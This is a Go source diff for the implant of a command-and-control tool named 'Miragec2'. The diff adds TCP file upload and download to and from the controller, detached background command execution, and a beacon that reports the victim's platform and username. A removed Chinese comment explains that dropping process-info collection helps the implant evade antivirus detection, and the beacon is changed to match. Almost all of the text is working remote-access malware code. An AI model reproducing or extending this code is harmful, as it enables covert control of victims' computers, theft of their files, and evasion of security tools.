@@ -9,14 +9,13 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
-	"os/user"
-	"path/filepath"
 	"runtime"
-	"strconv"
 	"strings"
 	"time"
 )
@@ -81,12 +80,93 @@ func splitCommand(command string) []string {
 	case "linux":
 		return []string{"sh", "-c", command}
 	case "windows":
-		return []string{"cmd", "/c", command}
+		return []string{"powershell", "-Command", command}
 	case "darwin":
-		return []string{"bash", "-c", command}
+		return []string{"zsh", "-c", command}
 	default:
 		return []string{command}
 	}
+}
+
+func execProcess(command string) []string {
+	switch platform {
+	case "linux":
+		return []string{"nohup","sh", "-c", command}
+	case "windows":
+		return []string{"powershell", "-Command", command}
+	case "darwin":
+		return []string{"nohup","zsh" ,"-c", command}
+	default:
+		return []string{command}
+	}
+}
+
+func fileTransferServer(action, fileandport, ip string) {
+	parts := strings.Split(fileandport, "[Mirage]")
+	partsfile := strings.Split(ip, ":")
+	conn, err := net.Dial("tcp", partsfile[0]+":"+parts[1])
+	if err != nil {
+		fmt.Println("[-] 连接服务端失败:", err)
+		return
+	}
+	defer conn.Close()
+
+	if action == "download" {
+		file, err := os.Open(parts[0]) // 待发送的文件
+		if err != nil {
+			fmt.Println("[-] 无法打开文件:", err)
+			return
+		}
+		defer file.Close()
+
+		// 读取并发送文件，同时计算进度
+		buffer := make([]byte, 4096)
+		var totalBytes int64
+		fileStat, _ := file.Stat()
+		fileSize := fileStat.Size()
+		for {
+			n, err := file.Read(buffer)
+			if n > 0 {
+				totalBytes += int64(n)
+				conn.Write(buffer[:n])
+				percentage := float64(totalBytes) / float64(fileSize) * 100
+				fmt.Printf("\r发送数据中: %.2f%%", percentage)
+			}
+			if err == io.EOF {
+				fmt.Println("\n[+] 文件发送完成!")
+				break
+			} else if err != nil {
+				fmt.Println("[-] 文件发送错误:", err)
+				break
+			}
+		}
+	} else {
+		file, err := os.Create(parts[0])
+		if err != nil {
+			fmt.Printf("[-] 无法创建文件: %v\n", err)
+			return
+		}
+		defer file.Close()
+
+		buffer := make([]byte, 4096)
+		var totalBytes int64
+		for {
+			n, err := conn.Read(buffer)
+			if n > 0 {
+				totalBytes += int64(n)
+				file.Write(buffer[:n])
+				fmt.Printf("\n[*] 接收数据中: %d bytes", totalBytes)
+			}
+			if err == io.EOF {
+				fmt.Printf("\n[+] 文件下载完成!\n")
+				break
+			} else if err != nil {
+				fmt.Printf("\n[-] 文件接收错误: %v\n", err)
+				break
+			}
+		}
+	}
+
 }
 
 func sendHearbeat(ip string, key string) bool {
@@ -111,6 +191,22 @@ func sendHearbeat(ip string, key string) bool {
 		orgcommand := DeResult(body, key)
 		execResult := make(map[int]string)
 		for id, value := range orgcommand {
+
+			switch id {
+			case 99997:
+				go fileTransferServer("download", value, ip)
+				continue
+			case 99996:
+				go fileTransferServer("upload", value, ip)
+				continue
+			case 99995,90000:
+				cmdParts := execProcess(value)
+				cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
+				cmd.Start()
+				fmt.Printf("[+] Process start\n")
+				continue
+			}
+
 			// 分割命令字符串
 			cmdParts := splitCommand(value)
 			cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
@@ -118,6 +214,7 @@ func sendHearbeat(ip string, key string) bool {
 			// 获取执行结果或错误信息
 			output, err := cmd.CombinedOutput()
 			if err != nil {
+			    fmt.Printf("[-] Command exec error: %v . output: %s\n",err,output)
 				execResult[id] = base64.StdEncoding.EncodeToString(crypto("[-+] Error: Bad Command: "+value+"\n", key))
 			} else {
 				execResult[id] = base64.StdEncoding.EncodeToString(crypto(string(output), key))
@@ -140,17 +237,20 @@ func sendHearbeat(ip string, key string) bool {
 	return false
 }
 
-var processid string
 var platform string
 
 func initshell(ip string, key string) string {
-	// 获取processname和processid这个步骤会被检测为获取系统敏感信息，如果没有这部分免杀效果会更好。
-	processname := filepath.Base(os.Args[0])
-	processid = strconv.Itoa(os.Getpid())
-	currentUser, _ := user.Current()
+    cmd := exec.Command("whoami")
+    currentUser, _ := cmd.Output()
+    currentUserstr := strings.TrimSpace(string(currentUser))
+
 	platform = runtime.GOOS
+    if platform == "windows" {
+        os.MkdirAll("C:\\temp", os.ModePerm)
+    }
 	client := &http.Client{}
-	message := base64.StdEncoding.EncodeToString(crypto("First Connection Miragec2[Mirage]"+platform+"[Mirage]"+processname+"[Mirage]"+processid+"[Mirage]"+currentUser.Username, key))
+	//message := base64.StdEncoding.EncodeToString(crypto("First Connection Miragec2[Mirage]"+platform+"[Mirage]"+string(processname)+"[Mirage]"+processid+"[Mirage]"+string(currentUser), key))
+	message := base64.StdEncoding.EncodeToString(crypto("First Connection Miragec2[Mirage]"+platform+"[Mirage]"+currentUserstr, key))
 	payload := strings.NewReader(`{"99999": "` + message + `"}`)
 	req, _ := http.NewRequest("POST", "http://"+ip+ResultUri, payload)
 	req.Header.Set("Content-Type", "application/json")
